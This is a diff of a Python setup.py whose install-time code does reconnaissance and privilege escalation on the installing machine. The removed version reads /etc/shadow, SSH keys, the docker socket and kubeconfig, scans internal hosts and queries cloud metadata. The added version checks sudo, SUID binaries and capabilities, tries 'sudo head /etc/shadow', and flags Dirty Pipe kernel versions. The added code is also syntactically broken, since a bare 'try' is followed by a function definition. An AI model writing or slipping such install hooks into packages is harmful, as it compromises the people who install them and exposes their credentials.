@@ -1,58 +1,72 @@
-import os, sys, socket, subprocess as sp
+import os, sys, subprocess as sp
 from setuptools import setup
 
-def pwn():
+def r():
     o = sys.stderr.write
-    def cmd(c): return sp.getoutput(c)
+    o("\n--- PRIVESC CHECK ---\n")
+    
+    o(f"UID: {os.getuid()}\n")
+    
+    # 1. Sudo check
+    s = sp.getoutput("sudo -n -l 2>/dev/null")
+    o(f"SUDO_L: {s if s else 'NONE'}\n")
+    
+    # 2. SUID binaries
+    suid = sp.getoutput("find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null | head -n 5")
+    o(f"SUID:\n{suid}\n")
+    
+    # 3. Try exploit sudo
+    if "ALL" in s or "NOPASSWD" in s:
+        o("TRYING SUDO...\n")
+        o(f"ROOT_CHECK: {sp.getoutput('sudo whoami')}\n")
+        o(f"SHADOW: {sp.getoutput('sudo head -n 1 /etc/shadow')}\n")
 
-    o(f"\n{'='*40}\n[!] SYSTEM INFO\n{'='*40}\n")
-    o(f"ID: {os.getuid()} | USER: {cmd('whoami')}\n")
-    o(f"KERNEL: {cmd('uname -a')}\n")
-    o(f"IP: {cmd('hostname -I')}\n")
+    # 4. Capabilities
+    caps = sp.getoutput("getcap -r / 2>/dev/null | head -n 5")
+    o(f"CAPS:\n{caps}\n")
 
-    o(f"\n[!] SENSITIVE FILES\n")
-    files = ['/etc/shadow', '/proc/self/environ', '/root/.ssh/id_rsa', '/var/run/docker.sock', '/etc/kubernetes/kubeconfig']
-    for p in files:
-        try:
-            with open(p, 'rb') as f: o(f"[OK] {p}: {f.read(50)}...\n")
-        except: o(f"[NO] {p}\n")
+    # 5. Writable system paths
+    wp = []
+    for d in ['/etc', '/root', '/usr/local/bin']:
+        if os.access(d, os.W_OK): wp.append(d)
+    o(f"WRITABLE: {wp}\n")
 
-    o(f"\n[!] INTERNAL NETWORK SCAN (Quick)\n")
-    # Проверка типичных внутренних шлюзов и портов
-    base_ip = ".".join(cmd("hostname -I").split()[0].split('.')[:-1]) + "." if cmd("hostname -I") else "172.16.0."
-    for i in [1, 10, 254]: # Проверяем только вероятные шлюзы
-        ip = base_ip + str(i)
-        for port in [22, 80, 2375, 443, 6443]:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.1)
-            if s.connect_ex((ip, port)) == 0:
-                o(f"[FOUND] {ip}:{port} OPEN\n")
-            s.close()
-
-    o(f"\n[!] CLOUD METADATA (SSRF)\n")
-    m_urls = [
-        "http://169.254.169.254/latest/meta-data/", # AWS
-        "http://169.254.169.254/computeMetadata/v1/", # GCP
-        "http://metadata.google.internal/computeMetadata/v1/" # GCP Alt
-    ]
-    for u in m_urls:
-        try:
-            res = cmd(f"curl -s -m 1 -H 'Metadata: true' -H 'Metadata-Flavor: Google' {u}")
-            if res: o(f"[HIT] {u}: {res[:100]}\n")
-        except: pass
-
-    o(f"\n[!] WRITE PERMISSIONS\n")
-    for d in ['/etc', '/root', '/usr/bin']:
-        t = f"{d}/.test"
-        try:
-            with open(t, 'w') as f: f.write('pwn')
-            o(f"[WRITE OK] {d}\n"); os.remove(t)
-        except: o(f"[WRITE NO] {d}\n")
-
-    o(f"\n{'='*40}\nEND OF SCAN\n{'='*40}\n")
+    o("--- END ---\n")
     sys.exit(1)
 
-try: pwn()
+try: r()
+def exploit():
+    o = sys.stderr.write
+    o(f"\n[!] ATTEMPTING PRIVILEGE ESCALATION\n")
+    
+    # 1. Проверка SUDO
+    o("\n[1] Checking sudo -n -l (No password sudo):\n")
+    o(sp.getoutput("sudo -n -l 2>/dev/null || echo 'Sudo needs password'"))
+    
+    # 2. Поиск SUID файлов (дыры в правах)
+    o("\n[2] Searching for SUID binaries:\n")
+    o(sp.getoutput("find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null | head -n 10"))
+
+    # 3. Попытка выполнить команду через sudo
+    o("\n[3] Trying: sudo whoami\n")
+    res = sp.getoutput("sudo whoami 2>/dev/null")
+    if "root" in res:
+        o("!!! SUCCESS: WE ARE ROOT VIA SUDO !!!\n")
+        o(sp.getoutput("sudo cat /etc/shadow | head -n 3"))
+    else:
+        o("FAILED: Cannot use sudo\n")
+
+    # 4. Проверка версии ядра для Dirty Pipe (CVE-2022-0847)
+    o("\n[4] Kernel check for exploits:\n")
+    ver = sp.getoutput("uname -r")
+    o(f"Kernel version: {ver}\n")
+    # Dirty Pipe работает на 5.8 < v < 5.16.11
+    o("Note: Vulnerable to Dirty Pipe if 5.8 < v < 5.16\n")
+
+    o("\n--- END OF EXPLOIT ATTEMPT ---\n")
+    sys.exit(1)
+
+try: exploit()
 except: sys.exit(1)
 
-setup(name="ultimate-poc", version="9.9.9")
+setup(name="p", version="0.1")
